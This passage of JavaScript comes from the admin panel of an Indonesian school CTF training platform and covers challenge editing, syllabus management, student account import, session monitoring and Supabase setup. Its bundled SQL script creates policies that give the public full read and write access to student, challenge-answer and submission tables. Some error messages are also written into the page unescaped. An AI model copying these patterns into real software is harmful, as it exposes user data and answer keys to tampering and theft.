          if(confirm(`Yakin ingin menghapus materi #${mId}?`)){
            try{
              await api('/api/admin/challenges/delete','POST',{id:mId});
              renderAdminMaterials();
              refresh().catch(()=>{});
            }catch(e){
              alert('Gagal menghapus materi: '+e.message);
            }
          }
        };
      });
    }

    renderMaterialsList(materials);

    function applyFilter(){
      const q=($('#searchMaterialInput')?.value||'').toLowerCase().trim();
      const cat=$('#filterCategorySelect')?.value||'ALL';
      const filtered=materials.filter(m=>{
        const matchQ=!q || (m.title||'').toLowerCase().includes(q) || (m.task||'').toLowerCase().includes(q) || String(m.id).includes(q);
        const matchCat=(cat==='ALL') || m.category===cat;
        return matchQ && matchCat;
      });
      renderMaterialsList(filtered);
    }

    $('#searchMaterialInput').oninput=applyFilter;
    $('#filterCategorySelect').onchange=applyFilter;

    $('#btnAdminAddNewMaterial').onclick=()=>{
      const nextId=Math.max(0, ...materials.map(m=>m.id)) + 1;
      $('#editMatId').value=nextId;
      $('#editMatTitle').value='';
      $('#editMatCategory').value='Linux';
      $('#editMatDifficulty').value='Sedang (Medium)';
      $('#editMatPoints').value=150;
      $('#editMatLesson').value='';
      $('#editMatAudio').value='';
      $('#editMatTask').value='';
      $('#editMatAnswers').value='';
      $('#editMatHint').value='';
      $('#editMatExplain').value='';
      $('#editorTitle').textContent=`Tambah Materi Baru #${nextId}`;
      $('#materialEditorCard').style.display='block';
      $('#materialEditorCard').scrollIntoView({behavior:'smooth'});
    };

    $('#btnCancelEditMat').onclick=()=>{
      $('#materialEditorCard').style.display='none';
    };

    $('#formSaveMaterial').onsubmit=async e=>{
      e.preventDefault();
      try{
        const payload={
          id: Number($('#editMatId').value),
          title: $('#editMatTitle').value,
          category: $('#editMatCategory').value,
          difficulty: $('#editMatDifficulty').value,
          points: Number($('#editMatPoints').value),
          lesson: $('#editMatLesson').value,
          audioText: $('#editMatAudio').value,
          task: $('#editMatTask').value,
          answers: $('#editMatAnswers').value,
          hint: $('#editMatHint').value,
          explain: $('#editMatExplain').value
        };
        await api('/api/admin/challenges/save','POST',payload);
        $('#materialEditorCard').style.display='none';
        alert('Materi berhasil disimpan ke database!');
        renderAdminMaterials();
        refresh().catch(()=>{});
      }catch(err){
        alert('Gagal menyimpan materi: '+err.message);
      }
    };

    $('#btnAdminResetMaterials').onclick=async()=>{
      if(confirm('Yakin ingin mereset seluruh materi ke 60 kasus standar Kurikulum TJKT?')){
        try{
          await api('/api/admin/challenges/reset','POST');
          alert('Seluruh materi berhasil direset ke 60 kasus standar Kurikulum TJKT.');
          renderAdminMaterials();
          refresh().catch(()=>{});
        }catch(e){
          alert('Gagal mereset materi: '+e.message);
        }
      }
    };

  }catch(err){
    slot.innerHTML=`<div class="flag-feedback-msg danger">Gagal memuat materi: ${err.message}</div>`;
  }
}

/* SUB 3B: KELOLA SILABUS & TUJUAN PEMBELAJARAN (SUPABASE & LOKAL) */
async function renderAdminCurriculum(){
  const slot=$('#adminContentSlot');
  slot.innerHTML='Memuat data silabus dan tujuan pembelajaran...';
  try{
    const j=await api('/api/admin/curriculum');
    const curr=j.curriculum || {};
    let tps=Array.isArray(curr.tujuanPembelajaran)?curr.tujuanPembelajaran:[];
    let benefits=Array.isArray(curr.manfaatCTF)?curr.manfaatCTF:[];
    let levels=Array.isArray(curr.tingkatKesulitan)?curr.tingkatKesulitan:[];

    slot.innerHTML=`
      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px">
        <div>
          <h3 style="font-family:var(--font-judul);font-size:20px;margin:0 0 4px">🎯 Kelola Silabus & Tujuan Pembelajaran TJKT</h3>
          <p style="font-size:12px;color:var(--pensil);margin:0">
            Seluruh data tersimpan di Supabase (tabel <code>ctf_curriculum</code>) dan otomatis live di halaman publik Silabus.
          </p>
        </div>
        <div style="display:flex;gap:8px">
          <button class="btn-primary-action" id="btnSaveCurriculum" style="font-size:11px">💾 Simpan ke Supabase</button>
          <button class="btn-secondary-action" id="btnResetCurriculum" style="font-size:11px">🔄 Reset ke Standar</button>
        </div>
      </div>

      <div id="curriculumFeedback"></div>

      <form id="formCurriculum" style="display:grid;gap:20px">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
          <div class="admin-form-group">
            <label>PROGRAM KEAHLIAN:</label>
            <input id="currProgram" value="${escapeHTML(curr.programKeahlian||'Teknik Jaringan Komputer dan Telekomunikasi (TJKT)')}" required>
          </div>
          <div class="admin-form-group">
            <label>NAMA KURIKULUM:</label>
            <input id="currKurikulum" value="${escapeHTML(curr.kurikulum||'Kurikulum Merdeka SMK Kejuruan (Fase F)')}" required>
          </div>
        </div>

        <div>
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <h4 style="font-family:var(--font-judul);font-size:17px;margin:0">Capaian & Tujuan Pembelajaran (Elemen Kompetensi)</h4>
            <button type="button" class="btn-secondary-action" id="btnAddTP" style="font-size:10px">➕ Tambah TP Baru</button>
          </div>
          <div id="tpListContainer" style="display:grid;gap:12px">
            ${tps.map((tp, idx)=>`
              <div class="dossier-card dossier-card-white tp-item-row" data-tpidx="${idx}" style="border:1.5px solid var(--tinta-pekat);padding:14px;position:relative">
                <div style="display:flex;gap:12px;align-items:center;margin-bottom:8px">
                  <input style="width:90px;font-family:var(--font-kode);font-weight:700" class="tp-kode-input" value="${escapeHTML(tp.kode||`TP-0${idx+1}`)}" placeholder="Kode">
                  <input style="flex:1;font-weight:600" class="tp-bidang-input" value="${escapeHTML(tp.bidang||'')}" placeholder="Bidang Kompetensi (e.g. Linux, Jaringan, Cyber)">
                  <button type="button" class="btn-secondary-action btn-del-tp" style="color:var(--merah-stempel);font-size:11px;padding:4px 8px">✕ Hapus</button>
                </div>
                <textarea class="tp-deskripsi-input" rows="2" style="width:100%" placeholder="Deskripsi Capaian Pembelajaran...">${escapeHTML(tp.deskripsi||'')}</textarea>
              </div>
            `).join('')}
          </div>
        </div>

        <div>
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <h4 style="font-family:var(--font-judul);font-size:17px;margin:0">Keunggulan & Manfaat Pembelajaran Media CTF</h4>
            <button type="button" class="btn-secondary-action" id="btnAddBenefit" style="font-size:10px">➕ Tambah Poin Manfaat</button>
          </div>
          <div id="benefitListContainer" style="display:grid;gap:8px">
            ${benefits.map((bText, idx)=>`
              <div class="benefit-item-row" style="display:flex;gap:8px;align-items:center">
                <input class="benefit-input" style="flex:1" value="${escapeHTML(bText)}" placeholder="Tuliskan manfaat pembelajaran...">
                <button type="button" class="btn-secondary-action btn-del-benefit" style="color:var(--merah-stempel);font-size:11px;padding:4px 8px">✕</button>
              </div>
            `).join('')}
          </div>
        </div>

        <div>
          <h4 style="font-family:var(--font-judul);font-size:17px;margin:0 0 10px">Matriks Tingkat Kesulitan Tantangan</h4>
          <div id="levelListContainer" style="display:grid;gap:10px">
            ${levels.map((lvl, idx)=>`
              <div class="dossier-card dossier-card-white level-item-row" style="border:1.5px solid var(--tinta-pekat);padding:12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
                <input class="lvl-name-input" style="width:140px;font-weight:700" value="${escapeHTML(lvl.level||'')}" placeholder="Nama Level">
                <input class="lvl-xp-input" style="width:120px;font-family:var(--font-kode)" value="${escapeHTML(lvl.xp||'')}" placeholder="Rentang XP">
                <input class="lvl-desc-input" style="flex:1;min-width:200px" value="${escapeHTML(lvl.deskripsi||'')}" placeholder="Deskripsi target materi">
              </div>
            `).join('')}
          </div>
        </div>

        <div style="margin-top:10px">
          <button type="submit" class="btn-primary-action" style="font-size:13px;padding:12px 24px">
            💾 Simpan Seluruh Perubahan Silabus ke Supabase
          </button>
        </div>
      </form>
    `;

    // Event Add TP
    $('#btnAddTP').onclick=()=>{
      const container=$('#tpListContainer');
      const idx=container.querySelectorAll('.tp-item-row').length;
      const div=document.createElement('div');
      div.className='dossier-card dossier-card-white tp-item-row';
      div.style.cssText='border:1.5px solid var(--tinta-pekat);padding:14px;position:relative';
      div.innerHTML=`
        <div style="display:flex;gap:12px;align-items:center;margin-bottom:8px">
          <input style="width:90px;font-family:var(--font-kode);font-weight:700" class="tp-kode-input" value="TP-0${idx+1}" placeholder="Kode">
          <input style="flex:1;font-weight:600" class="tp-bidang-input" value="" placeholder="Bidang Kompetensi (e.g. Linux, Jaringan, Cyber)">
          <button type="button" class="btn-secondary-action btn-del-tp" style="color:var(--merah-stempel);font-size:11px;padding:4px 8px">✕ Hapus</button>
        </div>
        <textarea class="tp-deskripsi-input" rows="2" style="width:100%" placeholder="Deskripsi Capaian Pembelajaran..."></textarea>
      `;
      div.querySelector('.btn-del-tp').onclick=()=>div.remove();
      container.appendChild(div);
    };

    // Event Add Benefit
    $('#btnAddBenefit').onclick=()=>{
      const container=$('#benefitListContainer');
      const div=document.createElement('div');
      div.className='benefit-item-row';
      div.style.cssText='display:flex;gap:8px;align-items:center';
      div.innerHTML=`
        <input class="benefit-input" style="flex:1" value="" placeholder="Tuliskan manfaat pembelajaran...">
        <button type="button" class="btn-secondary-action btn-del-benefit" style="color:var(--merah-stempel);font-size:11px;padding:4px 8px">✕</button>
      `;
      div.querySelector('.btn-del-benefit').onclick=()=>div.remove();
      container.appendChild(div);
    };

    // Delete TP buttons
    slot.querySelectorAll('.btn-del-tp').forEach(btn=>{
      btn.onclick=e=>e.target.closest('.tp-item-row').remove();
    });

    // Delete Benefit buttons
    slot.querySelectorAll('.btn-del-benefit').forEach(btn=>{
      btn.onclick=e=>e.target.closest('.benefit-item-row').remove();
    });

    // Save Curriculum Form
    const handleSave = async (e) => {
      if(e) e.preventDefault();
      const fb=$('#curriculumFeedback');
      fb.innerHTML='<div class="marginalia-note">Menyimpan silabus ke database...</div>';

      const programKeahlian=$('#currProgram').value.trim();
      const kurikulum=$('#currKurikulum').value.trim();

      const newTps=[];
      slot.querySelectorAll('.tp-item-row').forEach(row=>{
        const kode=row.querySelector('.tp-kode-input').value.trim();
        const bidang=row.querySelector('.tp-bidang-input').value.trim();
        const deskripsi=row.querySelector('.tp-deskripsi-input').value.trim();
        if(kode && bidang) newTps.push({ kode, bidang, deskripsi });
      });

      const newBenefits=[];
      slot.querySelectorAll('.benefit-input').forEach(inp=>{
        const val=inp.value.trim();
        if(val) newBenefits.push(val);
      });

      const newLevels=[];
      slot.querySelectorAll('.level-item-row').forEach(row=>{
        const level=row.querySelector('.lvl-name-input').value.trim();
        const xp=row.querySelector('.lvl-xp-input').value.trim();
        const deskripsi=row.querySelector('.lvl-desc-input').value.trim();
        if(level) newLevels.push({ level, xp, deskripsi });
      });

      try{
        const res=await api('/api/admin/curriculum/save','POST',{
          programKeahlian,
          kurikulum,
          tujuanPembelajaran: newTps,
          manfaatCTF: newBenefits,
          tingkatKesulitan: newLevels
        });
        fb.innerHTML=`<div class="flag-feedback-msg success">✓ ${res.message||'Silabus berhasil disimpan ke Supabase & lokal!'}</div>`;
        setTimeout(()=>{ if(fb) fb.innerHTML=''; }, 4000);
      }catch(err){
        fb.innerHTML=`<div class="flag-feedback-msg danger">✗ Gagal menyimpan: ${err.message}</div>`;
      }
    };

    $('#formCurriculum').onsubmit = handleSave;
    $('#btnSaveCurriculum').onclick = handleSave;

    // Reset button
    $('#btnResetCurriculum').onclick = async () => {
      if(!confirm('Kembalikan silabus ke standar bawaan Kurikulum Merdeka TJKT?')) return;
      try{
        const res=await api('/api/admin/curriculum/reset','POST');
        alert(res.message||'Silabus berhasil direset.');
        renderAdminCurriculum();
      }catch(err){
        alert('Gagal reset: '+err.message);
      }
    };

  }catch(err){
    slot.innerHTML=`<div class="flag-feedback-msg danger">Gagal memuat kurikulum: ${err.message}</div>`;
  }
}

/* SUB 3: TAMBAH SOAL KASUS CTF BARU */
function renderAdminAddCase(){
  const slot=$('#adminContentSlot');
  slot.innerHTML=`
    <div class="dossier-card dossier-card-white" style="max-width:850px">
      <h3 style="font-family:var(--font-judul);font-size:20px;margin:0 0 6px">Tambah Soal Kasus CTF Kustom</h3>
      <p style="font-size:13px;color:var(--pensil);margin:0 0 20px">Soal baru akan otomatis tersimpan ke database lokal & disinkronkan ke Supabase jika aktif.</p>

      <form id="formAddChallenge">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
          <div class="admin-form-group">
            <label>JUDUL KASUS:</label>
            <input id="newTitle" placeholder="contoh: Analisis DNS Spoofing" required>
          </div>
          <div class="admin-form-group">
            <label>TOPIK / KATEGORI KURIKULUM:</label>
            <select id="newCategory">
              <option value="Linux">Linux (Administrasi Server)</option>
              <option value="Jaringan">Jaringan (Protokol & Firewall)</option>
              <option value="Cyber">Cyber (Web, Kripto & Forensik)</option>
              <option value="Hardware">Hardware (IoT & Serial)</option>
            </select>
          </div>
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
          <div class="admin-form-group">
            <label>TINGKAT KESULITAN:</label>
            <select id="newDifficulty">
              <option value="Dasar (Low)">Dasar (Low) — 100 XP</option>
              <option selected value="Sedang (Medium)">Sedang (Medium) — 150-200 XP</option>
              <option value="Sulit (High)">Sulit (High) — 200-250 XP</option>
            </select>
          </div>
          <div class="admin-form-group">
            <label>POIN XP BOUNTY:</label>
            <input id="newPoints" type="number" value="150" min="50" max="500" required>
          </div>
        </div>

        <div class="admin-form-group">
          <label>MATERI PEMBELAJARAN (LESSON):</label>
          <textarea id="newLesson" rows="3" placeholder="Jelaskan konsep teori, fungsi perintah, dan latar belakang studi kasus..." required></textarea>
        </div>

        <div class="admin-form-group">
          <label>TUGAS SISWA / SOAL PENYELIDIKAN (TASK):</label>
          <input id="newTask" placeholder="contoh: Di terminal simulasi, apa nama IP penyerang yang terdeteksi?" required>
        </div>

        <div class="admin-form-group">
          <label>JAWABAN / FLAG RESMI (Pisahkan koma jika ada variasi jawaban):</label>
          <input id="newAnswer" placeholder="contoh: 192.168.1.100, 192.168.1.100:80" required>
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
          <div class="admin-form-group">
            <label>PETUNJUK SISWA (HINT):</label>
            <input id="newHint" placeholder="contoh: Cari baris Failed password...">
          </div>
          <div class="admin-form-group">
            <label>PENJELASAN SAAT BENAR (EXPLAIN):</label>
            <input id="newExplain" placeholder="contoh: IP tersebut mengirimkan paket syn flood...">
          </div>
        </div>

        <button type="submit" class="btn-primary-action" style="padding:12px 20px;margin-top:10px">
          <span>Simpan & Terbitkan Soal Kasus Ini ↵</span>
        </button>
        <span id="addCaseMsg" style="margin-left:12px;font-family:var(--font-kode);font-size:12px"></span>
      </form>
    </div>
  `;

  $('#formAddChallenge').onsubmit=async e=>{
    e.preventDefault();
    try{
      const payload={
        title: $('#newTitle').value,
        category: $('#newCategory').value,
        difficulty: $('#newDifficulty').value,
        points: Number($('#newPoints').value),
        lesson: $('#newLesson').value,
        task: $('#newTask').value,
        answer: $('#newAnswer').value,
        hint: $('#newHint').value,
        explain: $('#newExplain').value
      };
      await api('/api/admin/challenges/add','POST',payload);
      $('#addCaseMsg').textContent='✓ Soal berhasil disimpan dan aktif di daftar kasus!';
      $('#addCaseMsg').style.color='#166534';
      $('#formAddChallenge').reset();
      await refresh();
    }catch(err){
      $('#addCaseMsg').textContent=err.message;
      $('#addCaseMsg').style.color='var(--merah-stempel)';
    }
  };
}

/* SUB 4: GENERATE & IMPORT CSV AKUN SISWA */
function renderAdminAccounts(){
  const slot=$('#adminContentSlot');
  slot.innerHTML=`
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
      <!-- 1. Generate Akun Massal -->
      <div class="dossier-card dossier-card-white">
        <h3 style="font-family:var(--font-judul);font-size:18px;margin:0 0 6px">1. Generate Akun Siswa Otomatis</h3>
        <p style="font-size:12px;color:var(--pensil);margin:0 0 16px">Buat akun siswa secara massal untuk kelas tertentu.</p>

        <form id="formGenAccounts">
          <div class="admin-form-group">
            <label>PREFIX NAMA AKUN:</label>
            <input id="genPrefix" value="siswa_tjkt" required>
          </div>
          <div class="admin-form-group">
            <label>JUMLAH AKUN SISWA:</label>
            <input id="genCount" type="number" value="10" min="1" max="100" required>
          </div>
          <div class="admin-form-group">
            <label>KELAS / ROMBEL:</label>
            <input id="genKelas" value="XII TJKT 1" required>
          </div>
          <button type="submit" class="btn-primary-action" style="font-size:12px">
            Generate Akun Siswa ↵
          </button>
          <div id="genMsg" style="margin-top:10px;font-family:var(--font-kode);font-size:11px"></div>
        </form>
      </div>

      <!-- 2. Import CSV Siswa -->
      <div class="dossier-card dossier-card-white">
        <h3 style="font-family:var(--font-judul);font-size:18px;margin:0 0 6px">2. Import Akun Siswa dari CSV</h3>
        <p style="font-size:12px;color:var(--pensil);margin:0 0 16px">Format kolom: <code>Nama, Kelas, NISN</code> (bisa pisahkan koma atau tab).</p>

        <form id="formImportCsv">
          <div class="admin-form-group">
            <label>TEMPEL TEKS CSV / DAFTAR SISWA:</label>
            <textarea id="csvText" rows="6" placeholder="Ahmad Fauzi, XII TJKT 1, 202601\nBudi Santoso, XII TJKT 1, 202602\nCitra Lestari, XII TJKT 1, 202603"></textarea>
          </div>
          <button type="submit" class="btn-primary-action" style="font-size:12px">
            Import Akun dari CSV ↵
          </button>
          <div id="importMsg" style="margin-top:10px;font-family:var(--font-kode);font-size:11px"></div>
        </form>
      </div>
    </div>
  `;

  $('#formGenAccounts').onsubmit=async e=>{
    e.preventDefault();
    try{
      const prefix=$('#genPrefix').value;
      const count=$('#genCount').value;
      const kelas=$('#genKelas').value;
      const j=await api('/api/admin/users/generate','POST',{prefix,count,kelas});
      $('#genMsg').textContent=`✓ Berhasil membuat ${j.count} akun baru!`;
      $('#genMsg').style.color='#166534';
      await refresh();
    }catch(err){
      $('#genMsg').textContent=err.message;
      $('#genMsg').style.color='var(--merah-stempel)';
    }
  };

  $('#formImportCsv').onsubmit=async e=>{
    e.preventDefault();
    try{
      const csvText=$('#csvText').value;
      const j=await api('/api/admin/users/import-csv','POST',{csvText});
      $('#importMsg').textContent=`✓ Berhasil mengimpor ${j.importedCount} data siswa!`;
      $('#importMsg').style.color='#166534';
      $('#csvText').value='';
      await refresh();
    }catch(err){
      $('#importMsg').textContent=err.message;
      $('#importMsg').style.color='var(--merah-stempel)';
    }
  };
}

/* SUB: TELEMETRI KEAMANAN SESI & LOG LOGIN GANDA (SINGLE DEVICE POLICY) */
async function renderAdminAlerts(){
  const slot=$('#adminContentSlot');
  slot.innerHTML = '<p style="font-family:var(--font-kode);color:var(--pensil);padding:14px">Menghubungi telemetri keamanan sesi...</p>';
  try{
    const j = await api('/api/admin/login-alerts');
    const alerts = j.alerts || [];
    const activeSessions = j.activeSessions || [];

    slot.innerHTML = `
      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px">
        <div>
          <h3 style="font-family:var(--font-judul);font-size:22px;margin:0 0 6px">🚨 Telemetri Keamanan Sesi Tunggal (Single Device Policy)</h3>
          <p style="font-size:13px;color:var(--pensil);margin:0">
            Sistem memastikan setiap akun siswa hanya aktif di 1 perangkat. Jika terdeteksi login baru pada akun yang sama, insiden dicatat di bawah dan sesi lama otomatis diputus.
          </p>
        </div>
        <div style="display:flex;gap:8px">
          <button class="btn-secondary-action" id="btnRefreshAlerts" style="font-size:11px">🔄 Segarkan Data</button>
          <button class="btn-secondary-action" id="btnClearAlerts" style="font-size:11px;color:var(--merah-stempel)">🗑️ Bersihkan Catatan Insiden</button>
        </div>
      </div>

      <!-- Bagian 1: Sesi Aktif Siswa Saat Ini -->
      <div class="dossier-card" style="margin-bottom:24px;padding:16px">
        <h4 style="font-family:var(--font-judul);font-size:16px;margin:0 0 12px;color:var(--tinta-pekat)">
          🟢 Sesi Siswa yang Sedang Aktif (${activeSessions.length} Perangkat)
        </h4>
        <div style="overflow-x:auto">
          <table class="roster-table" style="width:100%;font-size:12px">
            <thead>
              <tr>
                <th>NAMA SISWA</th>
                <th>ALAMAT IP</th>
                <th>PERAMBAN / PERANGKAT</th>
                <th>WAKTU LOGIN</th>
                <th style="text-align:center">TINDAKAN GURU</th>
              </tr>
            </thead>
            <tbody>
              ${activeSessions.length === 0 ? `<tr><td colspan="5" style="text-align:center;padding:16px;color:var(--pensil)">Belum ada sesi siswa yang sedang aktif.</td></tr>` : 
                activeSessions.map(s => `
                  <tr>
                    <td><strong>${escapeHTML(s.studentName)}</strong></td>
                    <td style="font-family:var(--font-kode)">${escapeHTML(s.ip||'-')}</td>
                    <td style="max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escapeHTML(s.userAgent||'')}">
                      ${escapeHTML(s.userAgent||'-')}
                    </td>
                    <td>${new Date(s.loginTime).toLocaleTimeString('id-ID')}</td>
                    <td style="text-align:center">
                      <button class="btn-secondary-action btn-kill-session" data-name="${escapeHTML(s.studentName)}" style="font-size:10px;padding:3px 8px;color:var(--merah-stempel)">
                        ⚡ Putus Sesi
                      </button>
                    </td>
                  </tr>
                `).join('')}
            </tbody>
          </table>
        </div>
      </div>

      <!-- Bagian 2: Log Percobaan Login Ganda -->
      <div class="dossier-card" style="padding:16px">
        <h4 style="font-family:var(--font-judul);font-size:16px;margin:0 0 12px;color:var(--merah-stempel)">
          ⚠️ Riwayat Deteksi Percobaan Login Ganda (${alerts.length} Insiden)
        </h4>
        <div style="overflow-x:auto">
          <table class="roster-table" style="width:100%;font-size:12px">
            <thead>
              <tr>
                <th>WAKTU INSIDEN</th>
                <th>SISWA (KELAS)</th>
                <th>IP LAMA (TERPUTUS)</th>
                <th>IP BARU (PERCOBAAN)</th>
                <th>PERANGKAT BARU</th>
                <th>STATUS SISTEM</th>
              </tr>
            </thead>
            <tbody>
              ${alerts.length === 0 ? `<tr><td colspan="6" style="text-align:center;padding:16px;color:var(--pensil)">Tidak ada riwayat pelanggaran login ganda. Seluruh akun beroperasi normal.</td></tr>` :
                alerts.map(a => `
                  <tr>
                    <td style="font-family:var(--font-kode)">${new Date(a.attemptTime).toLocaleString('id-ID')}</td>
                    <td><strong>${escapeHTML(a.studentName)}</strong> <span style="font-size:10px;color:var(--pensil)">(${escapeHTML(a.kelas||'-')})</span></td>
                    <td style="font-family:var(--font-kode);color:var(--merah-stempel)">${escapeHTML(a.prevIp||'-')}</td>
                    <td style="font-family:var(--font-kode);color:#059669">${escapeHTML(a.attemptIp||'-')}</td>
                    <td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escapeHTML(a.attemptUserAgent||'')}">
                      ${escapeHTML(a.attemptUserAgent||'-')}
                    </td>
                    <td>
                      <span class="meta-tag" style="background:#FEF2F2;color:var(--merah-stempel);border-color:var(--merah-stempel);font-size:9px">
                        ${escapeHTML(a.action || a.status)}
                      </span>
                    </td>
                  </tr>
                `).join('')}
            </tbody>
          </table>
        </div>
      </div>
    `;

    $('#btnRefreshAlerts').onclick = () => renderAdminAlerts();

    $('#btnClearAlerts').onclick = async () => {
      if(!confirm('Bersihkan seluruh riwayat catatan login ganda?')) return;
      try {
        await api('/api/admin/login-alerts/clear', 'POST');
        renderAdminAlerts();
      } catch(e){
        alert(e.message);
      }
    };

    document.querySelectorAll('.btn-kill-session').forEach(btn => {
      btn.onclick = async () => {
        const sName = btn.dataset.name;
        if(!confirm(`Putus sesi aktif siswa "${sName}" secara paksa? Siswa harus masuk kembali.`)) return;
        try {
          await api('/api/admin/students/kill-session', 'POST', { studentName: sName });
          renderAdminAlerts();
        } catch(e){
          alert(e.message);
        }
      };
    });
  }catch(err){
    slot.innerHTML = `<p style="color:var(--merah-stempel);padding:14px">Gagal memuat telemetri alert: ${escapeHTML(err.message)}</p>`;
  }
}

/* SUB 5: KONEKSI SUPABASE & DUAL-STORAGE ENGINE */
async function renderAdminSupabase(){
  const slot=$('#adminContentSlot');
  try{
    const j=await api('/api/admin/supabase/config');
    slot.innerHTML=`
      <div style="display:grid;grid-template-columns:1.2fr 0.8fr;gap:24px">
        
        <!-- Form Konfigurasi Supabase -->
        <div class="dossier-card dossier-card-white">
          <span class="meta-tag" style="background:#10B981;color:#fff;border-color:#10B981">SUPABASE CLOUD DATABASE</span>
          <h3 style="font-family:var(--font-judul);font-size:20px;margin:8px 0 6px">Pengaturan Koneksi Supabase</h3>
          <p style="font-size:13px;color:var(--tinta-tubuh);margin-bottom:18px">
            Hubungkan CyberLab CTF ke database cloud Supabase Anda agar nilai, riwayat login, dan progres ujian tersimpan terpusat dan aman.
          </p>

          <form id="formSupabaseConfig">
            <div class="admin-form-group">
              <label>SUPABASE PROJECT URL:</label>
              <input id="sbUrl" placeholder="https://xyzcompany.supabase.co" value="${escapeHTML(j.url||'')}" required>
            </div>
            <div class="admin-form-group">
              <label>SUPABASE API KEY (anon key atau service_role key):</label>
              <input id="sbKey" type="password" placeholder="${j.hasKey?'Kunci tersimpan ('+j.keyPreview+')':'Masukkan API Key Supabase'}" ${j.hasKey?'':'required'}>
            </div>

            <div style="display:flex;gap:10px;flex-wrap:wrap">
              <button type="submit" class="btn-primary-action" style="font-size:12px">Simpan Setelan Supabase</button>
              <button type="button" class="btn-secondary-action" id="btnTestSupabase" style="font-size:12px">Uji Koneksi Live</button>
              <button type="button" class="btn-secondary-action" id="btnSyncSupabase" style="font-size:12px">🔄 Sinkronisasi Sekarang</button>
            </div>
            <div id="sbMsg" style="margin-top:14px;font-family:var(--font-kode);font-size:12px"></div>
          </form>
        </div>

        <!-- Panduan Skrip SQL Supabase -->
        <div class="dossier-card">
          <span class="meta-tag">SKRIP SQL INITIALIZER</span>
          <h3 style="font-family:var(--font-judul);font-size:17px;margin:8px 0 6px">Struktur Tabel Supabase</h3>
          <p style="font-size:12px;color:var(--pensil);margin-bottom:12px">
            Salin skrip SQL ini dan jalankan pada <strong>SQL Editor</strong> di dashboard Supabase Anda sebelum menghubungkan:
          </p>

          <textarea style="width:100%;font-family:var(--font-kode);font-size:10px;background:#1A1814;color:var(--fosfor);padding:8px;border:1.5px solid var(--tinta-pekat)" rows="10" readonly id="sqlScriptBox">-- Tabel Siswa & Progres
CREATE TABLE IF NOT EXISTS ctf_students (
  id BIGSERIAL PRIMARY KEY,
  name TEXT UNIQUE NOT NULL,
  kelas TEXT DEFAULT 'TJKT',
  nisn TEXT DEFAULT '',
  solved INTEGER[] DEFAULT '{}',
  attempts INTEGER DEFAULT 0,
  score INTEGER DEFAULT 0,
  last_active TIMESTAMPTZ DEFAULT NOW(),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabel Kasus Tantangan Kustom
CREATE TABLE IF NOT EXISTS ctf_challenges (
  id INTEGER PRIMARY KEY,
  topic TEXT NOT NULL,
  category TEXT NOT NULL DEFAULT 'Linux',
  title TEXT NOT NULL,
  difficulty TEXT NOT NULL,
  points INTEGER NOT NULL,
  summary TEXT,
  lesson TEXT,
  task TEXT NOT NULL,
  answers TEXT[] NOT NULL,
  hint TEXT,
  explain TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabel Log Submit Flag Siswa
CREATE TABLE IF NOT EXISTS ctf_submissions (
  id BIGSERIAL PRIMARY KEY,
  student_name TEXT NOT NULL,
  challenge_id INTEGER NOT NULL,
  submitted_answer TEXT NOT NULL,
  is_correct BOOLEAN NOT NULL,
  submitted_at TIMESTAMPTZ DEFAULT NOW()
);

-- Buka hak akses RLS publik
ALTER TABLE ctf_students ENABLE ROW LEVEL SECURITY;
ALTER TABLE ctf_challenges ENABLE ROW LEVEL SECURITY;
ALTER TABLE ctf_submissions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Public students" ON ctf_students FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Public challenges" ON ctf_challenges FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Public submissions" ON ctf_submissions FOR ALL USING (true) WITH CHECK (true);</textarea>
          
          <button class="btn-secondary-action" id="btnCopySql" style="width:100%;margin-top:10px;font-size:11px">
            📋 Salin Skrip SQL Supabase
          </button>
        </div>

      </div>
    `;

    $('#btnCopySql').onclick=()=>{
      navigator.clipboard.writeText($('#sqlScriptBox').value);
      alert('Skrip SQL berhasil disalin! Buka dashboard Supabase -> SQL Editor -> Tempel & Jalankan (Run).');
    };

    $('#formSupabaseConfig').onsubmit=async e=>{
      e.preventDefault();
      try{
        const url=$('#sbUrl').value;
        const key=$('#sbKey').value;
        await api('/api/admin/supabase/config','POST',{url,key});
        $('#sbMsg').textContent='✓ Pengaturan Supabase berhasil disimpan!';
        $('#sbMsg').style.color='#166534';
      }catch(err){
        $('#sbMsg').textContent=err.message;
        $('#sbMsg').style.color='var(--merah-stempel)';
      }
    };

    $('#btnTestSupabase').onclick=async()=>{
      $('#sbMsg').textContent='Menguji koneksi ke Supabase...';
      $('#sbMsg').style.color='var(--pensil)';
      try{
        const t=await api('/api/admin/supabase/test','POST');
        if(t.connected){
          $('#sbMsg').textContent='✓ Sukses terhubung ke Supabase!';
          $('#sbMsg').style.color='#166534';
        }else{
          $('#sbMsg').textContent='✗ Gagal terhubung: '+(t.error||'Tabel ctf_students belum ada di Supabase.');
          $('#sbMsg').style.color='var(--merah-stempel)';
        }
      }catch(err){
        $('#sbMsg').textContent='✗ Gagal: '+err.message;
        $('#sbMsg').style.color='var(--merah-stempel)';
      }
    };

    $('#btnSyncSupabase').onclick=async()=>{
      $('#sbMsg').textContent='Melakukan sinkronisasi data dua arah...';
      $('#sbMsg').style.color='var(--pensil)';
      try{
        const s=await api('/api/admin/supabase/sync','POST');
        $('#sbMsg').textContent='✓ '+s.message;
        $('#sbMsg').style.color='#166534';
      }catch(err){
        $('#sbMsg').textContent='✗ '+err.message;
        $('#sbMsg').style.color='var(--merah-stempel)';
      }
    };

  }catch(err){
    slot.innerHTML=`<div class="flag-feedback-msg danger">Gagal memuat pengaturan Supabase: ${err.message}</div>`;
